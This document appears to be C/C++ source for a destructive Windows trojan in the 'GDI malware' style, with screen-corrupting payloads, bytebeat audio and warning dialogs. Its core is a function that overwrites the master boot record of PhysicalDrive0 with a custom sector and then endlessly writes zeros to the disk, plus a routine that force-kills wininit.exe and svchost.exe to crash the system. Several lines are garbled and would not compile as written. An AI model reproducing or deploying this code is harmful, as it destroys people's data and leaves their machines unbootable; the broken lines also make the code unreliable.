typedef struct IUnknown IUnknown;
#include "payloads.h"

HCRYPTPROV prov;
DWORD xs;

HDC hdc = GetDC(0);
int x = GetSystemMetrics(0);
int y = GetSystemMetrics(1);

VOID Warning(
	LPVOID lpvd
) {
	if (MessageBoxW(0, L"This is a real malware \n If you run this program your PC/VM will be trashed! \n Still want to continue?", L"A Corruption Wind Is Coming...", MB_YESNO | MB_ICONWARNING) == IDNO)
		exit(0);
}


VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

VOID  ExecuteShader(TROJAN_SHADER shader, int nTime) {
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		//ReleaseDC(NULL, hdcScreen);
		//DeleteObject(hdcScreen);
		Sleep(10);
	}

	//DeleteObject(hbmScreen);
	//DeleteDC(hdcTempScreen);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}

// Payloads



VOID Shader1(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int tp = prgbScreen[i].rgb;
		prgbScreen[i].rgb = prgbScreen[i / 15 * 15].rgb;
		prgbScreen[i / 15 * 15].rgb = tp;
	}
}

VOID Shader2(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int tp = prgbScreen[i].rgb;
		prgbScreen[i].rgb = prgbScreen[i / 13 * 12].rgb, prgbScreen[i / 13 * 12].rgb, prgbScreen[i / 13 * 12].rgb % (RGB(rand() % 255, rand() % 255, rand() % 255));
		prgbScreen[i / 13 * 12].rgb = tp;
	}
}

VOID Payload1() {
	HDC uhdc = GetDC(GetForegroundWindow());
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0;
	int dY = 0;
	int dW;
	int dH;
	POINT wPt[3];
	int counter = 10;
	hWnd = GetDesktopWindow();
	hWindow = GetWindowDC(hWnd);
	GetWindowRect(hWnd, &wRect);
	dW = GetSystemMetrics(0);
	dH = GetSystemMetrics(0);
	wPt[0].x = wRect.left - counter;
	wPt[0].y = wRect.top + counter;
	wPt[1].x = wRect.right - counter;
	wPt[1].y = wRect.top - counter;
	wPt[2].x = wRect.left + counter;
	wPt[2].y = wRect.bottom + counter;
	fori(50) {
		SelectObject(hdc, CreateSolidBrush(RGB(
			rand() % 255,
			rand() % 255,
			rand() % 255
		)));
		BitBlt(hdc, rand() % 2, rand() % 2, x, y, hdc, rand() % 2, rand() % 2, SRCPAINT);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCCOPY);
		BitBlt(hdc, rand() % x, rand() % y, rand() % 600, rand() % 600, hdc, rand() % x, rand() % y, SRCPAINT);
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

	}
}


VOID Shader3(int t, int w, int h, PRGBQUAD prgbScreen) {
	PRGBQUAD tp = { 0 };
	tp = prgbScreen;
	for (int i = 0; i < h; i++) {
		for (int r = 0; r < w; r++) {
			prgbScreen[i * r].rgb = prgbScreen[i * 55 + i].rgb, tp[i * r * 99].rgb % (RGB(rand() % 255, rand() % 255, rand() % 255));
		}
	}
}

VOID ConstPayload() {
	fori (100) {
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ERROR));
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, rand() % x, rand() % y, L"ÖÆÂÝĆă", wcslen(L"ÖÆÂÝĆă"));
		TextOutW(hdc, rand() % x, rand() % y, L"ÖÆÂÝĆă", wcslen(L"ÖÆÂÝĆă"));
		TextOutW(hdc, rand() % x, rand() % y, L"ÖÆÂÝĆă", wcslen(L"ÖÆÂÝĆă"));
	}
}

VOID Shader4(int t, int w, int h, PRGBQUAD prgbScreen) {
	PRGBQUAD tp = { 0 };
	tp = prgbScreen;
	for (int i = 2; i < h / 2; i++) {
		for (int r = 0; r < w; r++) {
			prgbScreen[i * h + r].rgb = tp[(int)((float)(i * w + r) + (float)sqrt((3 * (w / 2) * i - i * i))) % (h * w)].rgb;
		}
	}
	for (int i = h / 2; i < w; i++) {
		for (int r = 0; r < h; r++) {
			prgbScreen[i * h + r].rgb = tp[(int)((float)(i * w + r) + (float)sqrt((3 * (w / 2) * i - i * i))) % (h * w)].rgb;
		}
	}
}

VOID Shader5(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 20) % (RGB(255, 255, 255));
	}
}

VOID Payload3() {
	RECT rect;
	HWND hw = GetDesktopWindow();
	GetWindowRect(hw, &rect);
	fori(300) {
		StretchBlt(hdc, 5, 5, rect.right - 10, rect.bottom - 10, hdc, 0, 0, rect.right, rect.bottom, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, x, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, x, x, hdc, 0, 0, SRCCOPY);
	}
}

VOID ByteBe1() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 80];
	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<chart >> 5] * t * 33);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

}

VOID ByteBe2() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 80];
	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<chart >> 5] * t * 33);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

}

VOID ByteBe3() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 80];
	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<chart >> 5] * t * 33);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

}

const char MBRData[512] = {
		0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C,
		0xE8, 0x00, 0x00, 0x50, 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8,
		0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4, 0x0E, 0xCD, 0x10, 0xC3,
		0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x09, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
		0xCD, 0x10, 0xC3, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F,
		0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x0D, 0x0A, 0x20, 0x20,
		0x5F, 0x5F, 0x7C, 0x5F, 0x5F, 0x20, 0x20, 0x20, 0x7C, 0x5F, 0x5F, 0x20,
		0x20, 0x0D, 0x0A, 0x20, 0x20, 0x2F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5C,
		0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x0D, 0x0A, 0x20, 0x7C, 0x20,
		0x20, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x20,
		0x0D, 0x0A, 0x20, 0x5C, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x2F, 0x20, 0x20,
		0x20, 0x5F, 0x5F, 0x7C, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x7C,
		0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x7C, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A,
		0x20, 0x0D, 0x0A, 0x4D, 0x42, 0x52, 0x20, 0x44, 0x65, 0x73, 0x74, 0x72,
		0x6F, 0x79, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x4F, 0x2E, 0x65, 0x78,
		0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

BOOL
WINAPI
MBROver(VOID)
{
	HANDLE hDrive;
	DWORD dwWrittenBytes;
	BOOL bSuccess;

	hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDrive == INVALID_HANDLE_VALUE)
	{
		MessageBoxW(NULL, L"I failed to infect your computer and I am a failure.\n...\nI hope you don't mind.\n(God, this is so embarrassing...)", L"Monoxide.exe", MB_OK | MB_ICONERROR);
		return FALSE;
	}

	bSuccess = WriteFile(hDrive, MBRData, 512, &dwWrittenBytes, NULL);

	if (!bSuccess)
	{
		MessageBoxW(NULL, L"Uhm... Why can't I overwrite your bootloader?\nOkay, well, I guess I can die now.", L"Monoxide.exe", MB_OK | MB_ICONERROR);
		CloseHandle(hDrive);

		return FALSE;
	}

	CHAR pcNullData[512];
	RtlZeroMemory(pcNullData, 512);

	for (;; WriteFile(hDrive, pcNullData, 512, &dwWrittenBytes, NULL));
}

VOID
BSOD(VOID) {
	system("C:\Windows\System32\taskkill /f /im wininit.exe");
	system("C:\Windows\System32\taskkill /f /im svchost.exe");
}


